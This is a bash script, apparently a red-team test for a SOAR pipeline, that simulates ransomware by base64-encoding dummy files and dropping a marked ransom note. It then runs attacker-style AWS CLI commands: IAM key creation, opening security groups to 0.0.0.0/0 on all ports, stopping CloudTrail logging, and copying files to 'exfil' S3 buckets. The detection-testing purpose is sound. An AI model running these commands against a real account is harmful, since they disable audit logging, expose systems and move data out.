#!/bin/bash
# ransomware_simulation.sh — Simulates a ransomware attack pattern
# This script mimics ransomware behavior that SOAR should detect and contain:
# 1. Rapid file encryption (creates many encrypted files)
# 2. Mass unauthorized API calls (attempted key creation, policy changes)
# 3. Leaves ransom note artifacts
#
# ⚠️  FOR TESTING ONLY — Run inside the attacker container

set -e

echo "=============================================="
echo "  🔴 RANSOMWARE SIMULATION (Red Team Test)"
echo "=============================================="
echo ""
echo "⚠️  This simulates ransomware-like behavior."
echo "GuardDuty / SCC should detect and SOAR should contain this."
echo ""

# Phase 1: Mass File Encryption (simulated)
echo "[Phase 1] Simulating mass file encryption..."
ENCRYPT_DIR="/tmp/ransomware_test"
mkdir -p "$ENCRYPT_DIR"

for i in $(seq 1 50); do
    echo "Sensitive data file #$i - $(date)" > "$ENCRYPT_DIR/important_doc_$i.txt"
    # Simulate encryption by base64 encoding
    base64 "$ENCRYPT_DIR/important_doc_$i.txt" > "$ENCRYPT_DIR/important_doc_$i.txt.encrypted"
    rm -f "$ENCRYPT_DIR/important_doc_$i.txt"
done

echo "   ✅ 50 files 'encrypted' in $ENCRYPT_DIR"

# Phase 2: Drop ransom note
cat > "$ENCRYPT_DIR/README_RANSOM.txt" << 'EOF'
YOUR FILES HAVE BEEN ENCRYPTED!
This is a SIMULATION for SOAR testing purposes.
No real data was harmed. Contact your Blue Team.
EOF
echo "   ✅ Ransom note dropped"

# Phase 3: Mass unauthorized API calls (triggers GuardDuty/CloudTrail anomalies)
echo "[Phase 2] Simulating mass unauthorized API calls..."

# Attempt to create many IAM access keys (will fail but generates CloudTrail events)
for i in $(seq 1 10); do
    aws iam create-access-key --user-name "nonexistent-user-$i" 2>/dev/null || true
done
echo "   ✅ 10 unauthorized CreateAccessKey attempts logged"

# Attempt to modify security groups rapidly
for i in $(seq 1 5); do
    aws ec2 authorize-security-group-ingress \
        --group-id "sg-fake$i" \
        --protocol tcp --port 0-65535 --cidr "0.0.0.0/0" 2>/dev/null || true
done
echo "   ✅ 5 unauthorized SecurityGroup modification attempts logged"

# Attempt to disable CloudTrail (triggers high-severity guardduty alert)
aws cloudtrail stop-logging --name "default" 2>/dev/null || true
echo "   ✅ CloudTrail stop-logging attempt logged"

# Phase 4: Exfiltration attempt
echo "[Phase 3] Simulating data exfiltration attempt..."
for i in $(seq 1 5); do
    aws s3 cp "$ENCRYPT_DIR/README_RANSOM.txt" "s3://nonexistent-bucket-exfil-$i/" 2>/dev/null || true
done
echo "   ✅ 5 S3 exfiltration attempts logged"

echo ""
echo "=============================================="
echo "  🎯 SIMULATION COMPLETE"
echo "=============================================="
echo "Expected SOAR Response:"
echo "  1. GuardDuty should flag IAM anomalies within ~60s"
echo "  2. CloudTrail alerts for stop-logging attempt"
echo "  3. SOAR should auto-isolate the source instance"
echo "  4. Slack alert with AI summary should fire"
echo "=============================================="
